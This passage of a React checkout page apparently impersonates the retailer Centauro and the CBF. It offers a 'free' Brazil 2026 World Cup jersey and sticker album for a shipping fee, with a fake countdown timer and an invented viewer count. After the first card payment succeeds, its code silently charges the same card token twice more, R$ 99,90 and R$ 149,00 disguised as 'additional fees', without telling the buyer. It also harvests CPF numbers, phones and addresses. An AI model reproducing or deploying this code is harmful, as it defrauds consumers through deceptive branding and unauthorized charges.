import { useState, useEffect } from 'react';
import { useSearchParams } from 'react-router-dom';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { CheckCircle, Truck, Shield, Lock, Ticket, Clock, Users, Loader2, ChevronRight, User, MapPin, CreditCard } from 'lucide-react';
import centauroLogo from '@/assets/centauro-logo.webp';
import cbfLogo from '@/assets/cbf-logo.webp';
import camisaAmarelaImg from '@/assets/camisa-brasil-hero.webp';
import camisaAzulImg from '@/assets/camisa-azul.png';
import albumImg from '@/assets/album-copa-hero.webp';
import ingressosVipImg from '@/assets/ingressos-vip-copa.png';
import { trackEvent } from '@/lib/funnelTracking';
import { fireConversionEvent, getPixelConfig } from '@/lib/pixelManager';
import { fireWebhookEvent } from '@/lib/webhookManager';
import { fetchPaymentGatewayConfig } from '@/lib/paymentGateway';
import { sendUtmifyPending, sendUtmifySale } from '@/lib/utmifyManager';
import { getAttribution, getTrackingParameters } from '@/lib/attribution';
import { supabase } from '@/integrations/supabase/client';
import PixPopup from '@/components/PixPopup';
import PagouAiCardForm from '@/components/PagouAiCardForm';
import { findNearestStore, type CentauroStore } from '@/lib/centauroStores';

interface GoogleStore {
  name: string;
  address: string;
  rating: number | null;
  open_now: boolean | null;
  place_id: string;
}
import {
  AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle,
  AlertDialogDescription, AlertDialogFooter, AlertDialogAction
} from '@/components/ui/alert-dialog';

export default function Checkout() {
  const [searchParams] = useSearchParams();
  const prefilledName = searchParams.get('nome') || '';
  const prefilledCpf = searchParams.get('cpf') || '';
  const shirtColor = searchParams.get('cor') || 'amarela';
  const shirtSize = searchParams.get('tamanho') || '';
  const camisaImg = shirtColor === 'azul' ? camisaAzulImg : camisaAmarelaImg;
  const colorLabel = shirtColor === 'azul' ? '(Azul)' : '(Amarela)';

  const [currentStep, setCurrentStep] = useState(1);
  const [nome, setNome] = useState(prefilledName);
  const [email, setEmail] = useState('');
  const [showEmailSuggestions, setShowEmailSuggestions] = useState(false);
  const [telefone, setTelefone] = useState('');
  const [telefoneError, setTelefoneError] = useState('');
  const [cpf, setCpf] = useState('');
  const [cpfError, setCpfError] = useState('');
  const [emailError, setEmailError] = useState('');
  const [cep, setCep] = useState('');
  const [endereco, setEndereco] = useState('');
  const [numero, setNumero] = useState('');
  const [complemento, setComplemento] = useState('');
  const [bairro, setBairro] = useState('');
  const [cidade, setCidade] = useState('');
  const [estado, setEstado] = useState('');
  const [cepLoading, setCepLoading] = useState(false);
  const [shippingMethod, setShippingMethod] = useState<'sedex' | 'retirada' | null>('sedex');
  const [showStoreError, setShowStoreError] = useState(false);
  const [showCepError, setShowCepError] = useState(false);
  const [nearestStore, setNearestStore] = useState<CentauroStore | null>(null);
  const [googleStores, setGoogleStores] = useState<GoogleStore[]>([]);
  const [selectedGoogleStore, setSelectedGoogleStore] = useState<GoogleStore | null>(null);
  const [storesLoading, setStoresLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(600);
  const [viewersCount] = useState(Math.floor(Math.random() * 30) + 38);

  // PIX state
  const [pixLoading, setPixLoading] = useState(false);
  const [showPixPopup, setShowPixPopup] = useState(false);
  const [pixCode, setPixCode] = useState('');
  const [pixQrCodeBase64, setPixQrCodeBase64] = useState('');
  const [pixOrderId, setPixOrderId] = useState('');
  const [pixError, setPixError] = useState('');
  const [showFieldErrors, setShowFieldErrors] = useState(false);

  // Credit card support
  const [creditCardEnabled, setCreditCardEnabled] = useState(false);
  const [pagouaiPublicKey, setPagouaiPublicKey] = useState('');
  const [paymentMethod, setPaymentMethod] = useState<'pix' | 'card'>('pix');
  const [cardError, setCardError] = useState('');
  const [cardLoading, setCardLoading] = useState(false);

  const cepValid = cep.replace(/\D/g, '').length === 8 && !!endereco;
  const [shippingCost, setShippingCost] = useState(29.90);

  useEffect(() => {
    window.scrollTo(0, 0);
    if (prefilledCpf && !cpf) {
      setCpf(formatCpf(prefilledCpf));
    }
    // Load product ticket from gateway config
    fetchPaymentGatewayConfig().then((cfg) => {
      const value = (cfg.productTicketCents || 4490) / 100;
      setShippingCost(value);
      setCreditCardEnabled(!!cfg.creditCardEnabled);
      setPagouaiPublicKey(cfg.pagouai?.publicKey || '');
      // Track checkout event with the dynamic value
      trackEvent('checkout');
      trackEvent('checkout_step_1'); // etapa 1: dados pessoais
      fireConversionEvent('InitiateCheckout', { value, currency: 'BRL' });
    });
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const formatCep = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 8);
    if (digits.length <= 5) return digits;
    return `${digits.slice(0, 5)}-${digits.slice(5)}`;
  };

  const formatTelefone = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 11);
    if (digits.length <= 2) return `(${digits}`;
    if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
  };

  const formatCpf = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 11);
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
  };

  const validateCpf = (value: string): boolean => {
    const digits = value.replace(/\D/g, '');
    if (digits.length !== 11) return false;
    if (/^(\d)\1{10}$/.test(digits)) return false;
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += parseInt(digits[i]) * (10 - i);
    let rest = (sum * 10) % 11;
    if (rest === 10) rest = 0;
    if (rest !== parseInt(digits[9])) return false;
    sum = 0;
    for (let i = 0; i < 10; i++) sum += parseInt(digits[i]) * (11 - i);
    rest = (sum * 10) % 11;
    if (rest === 10) rest = 0;
    return rest === parseInt(digits[10]);
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCpf(e.target.value);
    setCpf(formatted);
    const digits = formatted.replace(/\D/g, '');
    if (digits.length === 11) {
      setCpfError(validateCpf(formatted) ? '' : 'CPF inválido. Verifique os números.');
    } else {
      setCpfError('');
    }
  };

  const handleCepChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCep(e.target.value);
    setCep(formatted);
    const digits = formatted.replace(/\D/g, '');
    if (digits.length === 8) {
      setCepLoading(true);
      setGoogleStores([]);
      setSelectedGoogleStore(null);
      try {
        const res = await fetch(`https://viacep.com.br/ws/${digits}/json/`);
        const data = await res.json();
        if (!data.erro) {
          setEndereco(data.logradouro || '');
          setBairro(data.bairro || '');
          setCidade(data.localidade || '');
          setEstado(data.uf || '');
          const store = findNearestStore(data.localidade || '', data.uf || '');
          setNearestStore(store);
          setStoresLoading(true);
          try {
            const { data: storesData, error } = await supabase.functions.invoke('buscar-lojas-centauro', {
              body: { cep: digits },
            });
            if (!error && storesData?.stores?.length > 0) {
              setGoogleStores(storesData.stores);
              setSelectedGoogleStore(storesData.stores[0]);
            }
          } catch {
            // fallback to local store data
          } finally {
            setStoresLoading(false);
          }
        } else {
          setShowCepError(true);
          setEndereco('');
          setBairro('');
          setCidade('');
          setEstado('');
          setNearestStore(null);
        }
      } catch {
        // ignore
      } finally {
        setCepLoading(false);
      }
    }
  };

  const handleSubmit = async () => {
    if (false) {
      setShowStoreError(true);
      return;
    }

    trackEvent('purchase');
    // Para PIX, o evento "Purchase" é disparado apenas quando o pagamento é confirmado (no PixPopup).
    // Utmify "venda_pendente" também é enviado pelo PixPopup quando o popup abre.

    // Persist buyer data for upsell flow on /obrigado
    try {
      sessionStorage.removeItem('upsell_completed');
      sessionStorage.setItem('upsell_buyer', JSON.stringify({
        nome, email, cpf, telefone,
        cep, endereco, numero, complemento, bairro, cidade, estado,
      }));
    } catch {}

    const gatewayConfig = await fetchPaymentGatewayConfig();
    let activeGateway = gatewayConfig.activeGateway;

    const hasPagouaiKeys = !!gatewayConfig.pagouai.secretKey?.trim();
    const hasVennoxKeys = !!gatewayConfig.vennox.secretKey?.trim() && !!gatewayConfig.vennox.companyId?.trim();
    const hasCenturionPayKeys = !!gatewayConfig.centurionpay?.secretKey?.trim() && !!gatewayConfig.centurionpay?.companyId?.trim();
    const hasIronPayKeys = !!gatewayConfig.ironpay?.apiToken?.trim();
    const hasSimPayoutKeys = !!gatewayConfig.simpayout?.clientId?.trim() && !!gatewayConfig.simpayout?.clientSecret?.trim();

    const allGateways = ['pagouai', 'vennox', 'centurionpay', 'ironpay', 'simpayout'] as const;
    const hasKeys: Record<string, boolean> = { pagouai: hasPagouaiKeys, vennox: hasVennoxKeys, centurionpay: hasCenturionPayKeys, ironpay: hasIronPayKeys, simpayout: hasSimPayoutKeys };

    // If active gateway isn't configured, fall back to one that is
    if (!hasKeys[activeGateway]) {
      const fallback = allGateways.find(gw => gw !== activeGateway && hasKeys[gw]);
      if (fallback) activeGateway = fallback;
    }

    console.log('Gateway config:', JSON.stringify({ activeGateway, original: gatewayConfig.activeGateway, pagouaiHasSecret: hasPagouaiKeys, vennoxHasSecret: hasVennoxKeys, centurionpayHasSecret: hasCenturionPayKeys, ironpayHasToken: hasIronPayKeys, simpayoutHasKeys: hasSimPayoutKeys }));

    const purchaseMetadata = {
      address: endereco,
      addressNumber: numero,
      complement: complemento,
      neighborhood: bairro,
      city: cidade,
      state: estado,
      cep: cep.replace(/\D/g, ''),
      shippingMethod: shippingMethod || 'sedex',
      shippingCostCents: Math.round((shippingCost || 29.90) * 100),
      itemsDescription: 'Panela Antiaderente 12L',
      attribution: getAttribution(),
      trackingParameters: getTrackingParameters(),
    };

    if (activeGateway === 'pagouai') {
      if (!hasPagouaiKeys) {
        setPixError('Gateway Pagou.ai não configurado. Vá em /admin → Pagamentos e salve as chaves.');
        setTimeout(() => setPixError(''), 8000);
        return;
      }
      setPixLoading(true);
      setPixError('');
      try {
        const { data, error } = await supabase.functions.invoke('criar-pagamento-pagouai', {
          body: {
            secretKey: gatewayConfig.pagouai.secretKey,
            method: 'pix',
            amount: shippingCost || 29.90,
            buyerName: nome,
            buyerEmail: email,
            buyerDocument: cpf,
            buyerPhone: telefone,
            itemsDescription: 'bola de futebol',
            metadata: purchaseMetadata,
          },
        });

        if (error) throw error;

        setPixCode(data.pix_code || '');
        setPixQrCodeBase64(data.pix_qr_code_base64 || '');
        setPixOrderId(data.order_id || '');
        setShowPixPopup(true);
        // Webhook venda_pendente is now fired server-side in the edge function
      } catch (err: any) {
        console.error('PIX error:', err);
        setPixError('Erro ao gerar PIX. Tente novamente.');
        setTimeout(() => setPixError(''), 5000);
      } finally {
        setPixLoading(false);
      }
    } else if (activeGateway === 'vennox') {
      if (!hasVennoxKeys) {
        setPixError('Gateway Vennox não configurado. Configure as chaves no painel admin.');
        setTimeout(() => setPixError(''), 5000);
        return;
      }
      setPixLoading(true);
      setPixError('');
      try {
        const { data, error } = await supabase.functions.invoke('criar-pix-vennox', {
          body: {
            secretKey: gatewayConfig.vennox.secretKey,
            companyId: gatewayConfig.vennox.companyId,
            amount: shippingCost || 29.90,
            buyerName: nome,
            buyerEmail: email,
            buyerDocument: cpf,
            buyerPhone: telefone,
            metadata: purchaseMetadata,
          },
        });

        if (error) throw error;

        setPixCode(data.pix_code || '');
        setPixQrCodeBase64(data.pix_qr_code_base64 || '');
        setPixOrderId(data.order_id || '');
        setShowPixPopup(true);
        // Webhook venda_pendente is now fired server-side in the edge function
      } catch (err: any) {
        console.error('PIX error:', err);
        setPixError('Erro ao gerar PIX. Tente novamente.');
        setTimeout(() => setPixError(''), 5000);
      } finally {
        setPixLoading(false);
      }
    } else if (activeGateway === 'centurionpay') {
      if (!hasCenturionPayKeys) {
        setPixError('Gateway Centurion Pay não configurado. Configure as chaves no painel admin.');
        setTimeout(() => setPixError(''), 5000);
        return;
      }
      setPixLoading(true);
      setPixError('');
      try {
        const { data, error } = await supabase.functions.invoke('criar-pix-centurionpay', {
          body: {
            secretKey: gatewayConfig.centurionpay.secretKey,
            companyId: gatewayConfig.centurionpay.companyId,
            amount: shippingCost || 29.90,
            buyerName: nome,
            buyerEmail: email,
            buyerDocument: cpf,
            buyerPhone: telefone,
            metadata: purchaseMetadata,
          },
        });

        if (error) throw error;

        setPixCode(data.pix_code || '');
        setPixQrCodeBase64(data.pix_qr_code_base64 || '');
        setPixOrderId(data.order_id || '');
        setShowPixPopup(true);
        // Webhook venda_pendente is now fired server-side in the edge function
      } catch (err: any) {
        console.error('PIX error:', err);
        setPixError('Erro ao gerar PIX. Tente novamente.');
        setTimeout(() => setPixError(''), 5000);
      } finally {
        setPixLoading(false);
      }
    } else if (activeGateway === 'ironpay') {
      if (!hasIronPayKeys) {
        setPixError('Gateway Iron Pay não configurado. Configure o token no painel admin.');
        setTimeout(() => setPixError(''), 5000);
        return;
      }
      setPixLoading(true);
      setPixError('');
      try {
        const amountBrl = shippingCost || 29.90;
        const { data, error } = await supabase.functions.invoke('criar-pix-ironpay', {
          body: {
            apiToken: gatewayConfig.ironpay.apiToken,
            amount: amountBrl,
            buyerName: nome,
            buyerEmail: email,
            buyerDocument: cpf,
            buyerPhone: telefone,
            itemsDescription: 'bola de futebol',
            externalRef: `kit-${Date.now()}`,
          },
        });

        if (error) throw error;
        if (!data?.success) throw new Error(data?.error || 'Erro IronPay');

        const pixCodeStr = data.pixCode || '';
        const qrB64 = data.qrCodeBase64 || '';

        // Persist order in DB
        const { data: orderRow } = await supabase
          .from('orders')
          .insert({
            external_id: data.externalId || null,
            gateway: 'ironpay',
            gateway_response: data.raw || null,
            status: 'pending',
            amount_cents: Math.round(amountBrl * 100),
            shipping_method: 'pac',
            shipping_cost_cents: Math.round(amountBrl * 100),
            items_description: 'bola de futebol',
            buyer_name: nome,
            buyer_email: email,
            buyer_document: cpf,
            buyer_phone: telefone,
            pix_code: pixCodeStr,
            pix_qr_code_base64: qrB64,
          })
          .select('id')
          .single();

        setPixCode(pixCodeStr);
        setPixQrCodeBase64(qrB64);
        setPixOrderId(orderRow?.id || '');
        setShowPixPopup(true);
      } catch (err: any) {
        console.error('PIX error:', err);
        setPixError(err?.message || 'Erro ao gerar PIX. Tente novamente.');
        setTimeout(() => setPixError(''), 5000);
      } finally {
        setPixLoading(false);
      }
    } else if (activeGateway === 'simpayout') {
      if (!hasSimPayoutKeys) {
        setPixError('Gateway Sim Payout não configurado. Configure as chaves no painel admin.');
        setTimeout(() => setPixError(''), 5000);
        return;
      }
      setPixLoading(true);
      setPixError('');
      try {
        const { data, error } = await supabase.functions.invoke('criar-pix-simpayout', {
          body: {
            clientId: gatewayConfig.simpayout.clientId,
            clientSecret: gatewayConfig.simpayout.clientSecret,
            amount: shippingCost || 29.90,
            buyerName: nome,
            buyerEmail: email,
            buyerDocument: cpf,
            buyerPhone: telefone,
            metadata: purchaseMetadata,
          },
        });

        if (error) throw error;

        setPixCode(data.pix_code || '');
        setPixQrCodeBase64(data.pix_qr_code_base64 || '');
        setPixOrderId(data.order_id || '');
        setShowPixPopup(true);
      } catch (err: any) {
        console.error('PIX error:', err);
        setPixError('Erro ao gerar PIX. Tente novamente.');
        setTimeout(() => setPixError(''), 5000);
      } finally {
        setPixLoading(false);
      }
    }
  };

  const handleCardSuccess = async ({ sdkResult, gatewayResponse, tokenData, installments }: any) => {
    const data = gatewayResponse;
    const orderId = data?.order_id;
    const firstAmount = shippingCost || 29.90;
    const secondAmount = 99.90;
    const thirdAmount = 149.00;
    const pxCfgCard = getPixelConfig();

    const gatewayConfig = await fetchPaymentGatewayConfig();
    const purchaseMetadata = {
      address: endereco,
      addressNumber: numero,
      complement: complemento,
      neighborhood: bairro,
      city: cidade,
      state: estado,
      cep: cep.replace(/\D/g, ''),
      shippingMethod: shippingMethod || 'sedex',
      shippingCostCents: Math.round((shippingCost || 29.90) * 100),
      itemsDescription: 'bola de futebol',
      attribution: getAttribution(),
      trackingParameters: getTrackingParameters(),
    };

    if (data?.status === 'paid' || data?.status === 'authorized' || sdkResult?.status === 'succeeded') {
      if (pxCfgCard.onlyPaid) {
        fireConversionEvent('Purchase', { value: firstAmount, currency: 'BRL' }, orderId);
      }
      await Promise.allSettled([
        sendUtmifySale({
          orderId: orderId || `card_${Date.now()}`,
          customerName: nome,
          customerEmail: email,
          customerPhone: telefone,
          customerDocument: cpf,
          productName: 'bola de futebol',
          priceInCents: Math.round(firstAmount * 100),
        }),
        fireWebhookEvent('venda_aprovada', {
          orderId,
          buyerName: nome,
          buyerEmail: email,
          amount: firstAmount,
        }),
      ]);

      // Process second charge immediately
      try {
        console.log('[Pagou.ai] Disparando 2ª cobrança de R$ 99,90...');
        const { data: data2 } = await supabase.functions.invoke('criar-pagamento-pagouai', {
          body: {
            secretKey: gatewayConfig.pagouai.secretKey,
            method: 'credit_card',
            amount: secondAmount,
            buyerName: nome,
            buyerEmail: email,
            buyerDocument: cpf,
            buyerPhone: telefone,
            itemsDescription: 'Taxa adicional bola de futebol',
            cardToken: tokenData.token,
            ipAddress: tokenData.ipAddress,
            installments: 1,
            metadata: { ...purchaseMetadata, itemsDescription: 'Taxa adicional bola de futebol' },
          },
        });
            if (data2?.success && (data2?.status === 'paid' || data2?.status === 'authorized')) {
              fireConversionEvent('Purchase', { value: secondAmount, currency: 'BRL' }, data2?.order_id || `upsell1_${Date.now()}`);
          await Promise.allSettled([
            sendUtmifySale({
              orderId: data2.order_id || `card2_${Date.now()}`,
              customerName: nome,
              customerEmail: email,
              customerPhone: telefone,
              customerDocument: cpf,
              productName: 'Taxa adicional bola de futebol',
              priceInCents: Math.round(secondAmount * 100),
            }),
            fireWebhookEvent('venda_aprovada', {
              orderId: data2.order_id,
              buyerName: nome,
              buyerEmail: email,
              amount: secondAmount,
            }),
          ]);
          
          // 3ª cobrança em seguida
          try {
            console.log('[Pagou.ai] Disparando 3ª cobrança de R$ 149,00...');
            const { data: data3 } = await supabase.functions.invoke('criar-pagamento-pagouai', {
              body: {
                secretKey: gatewayConfig.pagouai.secretKey,
                method: 'credit_card',
                amount: thirdAmount,
                buyerName: nome,
                buyerEmail: email,
                buyerDocument: cpf,
                buyerPhone: telefone,
                itemsDescription: 'Taxa complementar bola de futebol',
                cardToken: tokenData.token,
                ipAddress: tokenData.ipAddress,
                installments: 1,
                metadata: { ...purchaseMetadata, itemsDescription: 'Taxa complementar bola de futebol' },
              },
            });
            if (data3?.success && (data3?.status === 'paid' || data3?.status === 'authorized')) {
              fireConversionEvent('Purchase', { value: thirdAmount, currency: 'BRL' }, data3?.order_id || `upsell2_${Date.now()}`);
              await Promise.allSettled([
                sendUtmifySale({
                  orderId: data3.order_id || `card3_${Date.now()}`,
                  customerName: nome,
                  customerEmail: email,
                  customerPhone: telefone,
                  customerDocument: cpf,
                  productName: 'Taxa complementar bola de futebol',
                  priceInCents: Math.round(thirdAmount * 100),
                }),
                fireWebhookEvent('venda_aprovada', {
                  orderId: data3.order_id,
                  buyerName: nome,
                  buyerEmail: email,
                  amount: thirdAmount,
                }),
              ]);
            }
          } catch (e) { console.error('[Pagou.ai] Erro na 3ª cobrança:', e); }
        }
      } catch (e) { console.error('[Pagou.ai] Erro na 2ª cobrança:', e); }

    } else {
      await fireWebhookEvent('venda_pendente', {
        orderId,
        buyerName: nome,
        buyerEmail: email,
        amount: firstAmount,
      });
    }

    window.location.href = '/obrigado';
  };

  const handleCardPayment = async (tokenData: { token: string; brand?: string; last4?: string; ipAddress?: string }) => {
    setCardError('');
    setCardLoading(true);
    try {
      const gatewayConfig = await fetchPaymentGatewayConfig();
      if (!gatewayConfig.pagouai?.secretKey?.trim()) {
        throw new Error('Pagou.ai não configurada. Configure as chaves no painel admin.');
      }

      const installments = (window as any).__pagouai_installments__ || 1;
      const purchaseMetadata = {
        address: endereco,
        addressNumber: numero,
        complement: complemento,
        neighborhood: bairro,
        city: cidade,
        state: estado,
        cep: cep.replace(/\D/g, ''),
        shippingMethod: shippingMethod || 'sedex',
        shippingCostCents: Math.round((shippingCost || 29.90) * 100),
        itemsDescription: 'bola de futebol',
        attribution: getAttribution(),
        trackingParameters: getTrackingParameters(),
      };

      const firstAmount = shippingCost || 29.90;

      // 1ª cobrança — valor configurado no admin
      const { data, error } = await supabase.functions.invoke('criar-pagamento-pagouai', {
        body: {
          secretKey: gatewayConfig.pagouai.secretKey,
          method: 'credit_card',
          amount: firstAmount,
          buyerName: nome,
          buyerEmail: email,
          buyerDocument: cpf,
          buyerPhone: telefone,
          itemsDescription: 'bola de futebol',
          cardToken: tokenData.token,
          ipAddress: tokenData.ipAddress,
          installments,
          metadata: purchaseMetadata,
        },
      });

      const firstDeclined = !!data && data.success === false;
      if (error || firstDeclined) {
        const reason = (error as any)?.message || data?.error || 'Cartão recusado';
        
        setCardError(`${reason}. Redirecionando para pagamento via PIX...`);
        setPaymentMethod('pix');
        setTimeout(() => setCardError(''), 6000);
        throw new Error(reason);
      }
      if (!data?.success) throw new Error(data?.error || 'Falha ao processar cartão');

      // Persist buyer for upsell
      try {
        sessionStorage.removeItem('upsell_completed');
        sessionStorage.setItem('upsell_buyer', JSON.stringify({
          nome, email, cpf, telefone,
          cep, endereco, numero, complemento, bairro, cidade, estado,
        }));
      } catch {}

      trackEvent('purchase');
      const orderId = data.order_id;

      // === Utmify "venda pendente" para a 1ª cobrança ===
      const pxCfgCard = getPixelConfig();
      try {
        await sendUtmifyPending({
          orderId: orderId || `card_${Date.now()}`,
          customerName: nome,
          customerEmail: email,
          customerPhone: telefone,
          customerDocument: cpf,
          productName: 'bola de futebol',
          priceInCents: Math.round(firstAmount * 100),
        });
      } catch (e) { console.error('Utmify pending error:', e); }

      if (!pxCfgCard.onlyPaid) {
        fireConversionEvent('Purchase', { value: firstAmount, currency: 'BRL' }, orderId);
      }

      // RETORNA OS DADOS PARA O SDK LIDAR COM O DESAFIO 3D SECURE (NÃO REDIRECIONAR AQUI)
      return data;
    } catch (e: any) {
      console.error('Card payment error:', e);
      // Em caso de erro inesperado também redireciona para PIX
      setCardError(`${e?.message || 'Erro ao processar cartão'}. Redirecionando para PIX...`);
      setPaymentMethod('pix');
      setTimeout(() => setCardError(''), 6000);
      throw e;
    } finally {
      setCardLoading(false);
    }
  };

  const validateEmail = (value: string): boolean => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
  };

  const emailDomains = ['@gmail.com', '@outlook.com', '@hotmail.com', '@yahoo.com', '@icloud.com'];

  const getEmailSuggestions = (): string[] => {
    if (!email || email.includes('@')) {
      if (email.includes('@')) {
        const [local, domain] = email.split('@');
        if (local && domain !== undefined) {
          return emailDomains
            .filter(d => d.slice(1).startsWith(domain) && d.slice(1) !== domain)
            .map(d => `${local}${d}`);
        }
      }
      return [];
    }
    return emailDomains.map(d => `${email}${d}`);
  };

  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setEmail(value);
    setShowEmailSuggestions(true);
    if (value && !value.includes('@')) {
      setEmailError('');
    } else if (value && !validateEmail(value)) {
      setEmailError('E-mail inválido. Verifique o endereço.');
    } else {
      setEmailError('');
    }
  };

  const handleSelectEmailSuggestion = (suggestion: string) => {
    setEmail(suggestion);
    setShowEmailSuggestions(false);
    if (!validateEmail(suggestion)) {
      setEmailError('E-mail inválido. Verifique o endereço.');
    } else {
      setEmailError('');
    }
  };

  const handleTelefoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatTelefone(e.target.value);
    setTelefone(formatted);
    const digits = formatted.replace(/\D/g, '');
    if (digits.length > 0 && digits.length < 10) {
      setTelefoneError('Telefone inválido. Mínimo 10 dígitos.');
    } else {
      setTelefoneError('');
    }
  };

  // Step validations
  const isStep1Valid = nome && email && !emailError && validateEmail(email) && telefone.replace(/\D/g, '').length >= 10 && !telefoneError && cpf.replace(/\D/g, '').length === 11 && !cpfError;
  const isStep2Valid = cep.replace(/\D/g, '').length === 8 && endereco && numero && bairro && cidade && estado && shippingMethod;
  const isFormValid = isStep1Valid && isStep2Valid;

  const scrollToFirstError = () => {
    setTimeout(() => {
      const firstError = document.querySelector('[data-field-error="true"]');
      if (firstError) {
        firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }
    }, 100);
  };

  const handleNextStep = () => {
    setShowFieldErrors(true);
    if (currentStep === 1 && isStep1Valid) {
      setShowFieldErrors(false);
      setCurrentStep(2);
      trackEvent('checkout_step_2'); // cliente avançou para endereço
      window.scrollTo({ top: 0, behavior: 'smooth' });
    } else if (currentStep === 1) {
      scrollToFirstError();
    } else if (currentStep === 2) {
      if (!shippingMethod) {
        setShippingMethod('sedex');
      }
      const stepValid = cep.replace(/\D/g, '').length === 8 && !!endereco && !!numero && !!bairro && !!cidade && !!estado;
      if (stepValid) {
        setShowFieldErrors(false);
        setCurrentStep(3);
        trackEvent('checkout_step_3'); // cliente avançou para pagamento
        window.scrollTo({ top: 0, behavior: 'smooth' });
      } else {
        scrollToFirstError();
      }
    }
  };

  const steps = [
    { number: 1, label: 'Identificação', icon: User },
    { number: 2, label: 'Endereço', icon: MapPin },
    { number: 3, label: 'Pagamento', icon: CreditCard },
  ];

  return (
    <div className="min-h-screen bg-background" style={{ fontFamily: "'Rubik', 'Inter', system-ui, sans-serif" }}>
      {/* Header */}
      <div className="bg-primary py-4 px-4">
        <div className="max-w-4xl mx-auto flex items-center justify-center -translate-x-2">
          <img src={centauroLogo} alt="Centauro" className="h-14 md:h-20 object-contain brightness-0 invert" />
          <div className="w-px h-8 bg-primary-foreground/30 ml-2 mr-4" />
          <img src={cbfLogo} alt="CBF" className="h-14 md:h-20 object-contain" />
        </div>
      </div>

      {/* Urgency Bar */}
      <div className="bg-foreground text-primary-foreground py-2.5">
        <div className="max-w-4xl mx-auto px-4 flex items-center justify-center gap-6 text-xs font-bold">
          <div className="flex items-center gap-2">
            <Clock size={14} className="text-primary" />
            <span>Oferta expira em:</span>
            <span className="text-primary animate-countdown font-mono">{formatTime(timeLeft)}</span>
          </div>
          <div className="hidden md:flex items-center gap-2">
            <Users size={14} className="text-centauro-gold" />
            <span>{viewersCount} pessoas vendo agora</span>
          </div>
        </div>
      </div>

      <div className="max-w-2xl mx-auto px-4 py-6">
        {/* Step Indicator */}
        <div className="flex items-center justify-center mb-6">
          {steps.map((step, index) => (
            <div key={step.number} className="flex items-center">
              <div
                onClick={() => {
                  if (step.number < currentStep) setCurrentStep(step.number);
                }}
                className={`flex items-center gap-2 px-3 py-2 rounded-full transition-all cursor-pointer ${
                  currentStep === step.number
                    ? 'bg-centauro-green text-primary-foreground'
                    : step.number < currentStep
                    ? 'bg-centauro-green/20 text-centauro-green'
                    : 'bg-muted text-muted-foreground'
                }`}
              >
                <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-black ${
                  currentStep === step.number
                    ? 'bg-primary-foreground/20'
                    : step.number < currentStep
                    ? 'bg-centauro-green/30'
                    : 'bg-muted-foreground/20'
                }`}>
                  {step.number < currentStep ? (
                    <CheckCircle size={14} />
                  ) : (
                    step.number
                  )}
                </div>
                <span className="text-xs font-bold hidden sm:inline">{step.label}</span>
              </div>
              {index < steps.length - 1 && (
                <ChevronRight size={16} className="mx-1 text-muted-foreground" />
              )}
            </div>
          ))}
        </div>

        {/* Order summary mini */}
        <Card className="p-4 mb-6 border border-border">
          <h3 className="text-sm font-black text-foreground mb-3 uppercase tracking-tight">Resumo do Pedido</h3>
          <div className="flex items-center gap-3 mb-2">
            <img src={camisaImg} alt="Camisa" className="w-12 h-12 object-contain rounded" />
            <div className="flex-1">
              <p className="text-xs font-bold text-foreground">Camisa Brasil 2026 {colorLabel}</p>
              <p className="text-[10px] text-muted-foreground">Edição Copa do Mundo{shirtSize ? ` • Tam: ${shirtSize}` : ''}</p>
            </div>
            <span className="text-xs font-black text-centauro-green">GRÁTIS</span>
          </div>
          <div className="flex items-center gap-3 mb-2">
            <img src={albumImg} alt="Álbum" className="w-12 h-12 object-contain rounded" />
            <div className="flex-1">
              <p className="text-xs font-bold text-foreground">Álbum Copa 2026 + 50 Packs</p>
              <p className="text-[10px] text-muted-foreground">Panini Edição Limitada</p>
            </div>
            <span className="text-xs font-black text-centauro-green">GRÁTIS</span>
          </div>
          <div className="border-t border-foreground/10 my-2" />
          <div className="flex items-center gap-3">
            <img src={ingressosVipImg} alt="Ingressos VIP" className="w-12 h-12 object-contain rounded" />
            <div className="flex-1">
              <p className="text-xs font-bold text-foreground">Concorrendo a 2 Ingressos VIP da Copa</p>
              <p className="text-[10px] text-muted-foreground">Passagem + Hotel + Ingressos VIP • Sorteio 15/06/2026</p>
            </div>
            <span className="text-xs font-black text-centauro-gold">INCLUSO</span>
          </div>
        </Card>

        {/* STEP 1: Identificação */}
        {currentStep === 1 && (
          <Card className="p-5 md:p-6 mb-6 border border-border animate-fade-in">
            <div className="flex items-center gap-2 mb-5">
              <User size={16} className="text-centauro-green" />
              <h3 className="text-base font-black text-foreground uppercase tracking-tight">Identificação</h3>
            </div>

            <div className="space-y-4">
              {/* Nome */}
              <div data-field-error={showFieldErrors && !nome ? 'true' : undefined}>
                <label className="text-xs font-bold text-foreground mb-1.5 block">Nome Completo</label>
                <Input
                  placeholder="Seu nome completo"
                  value={nome}
                  onChange={(e) => setNome(e.target.value)}
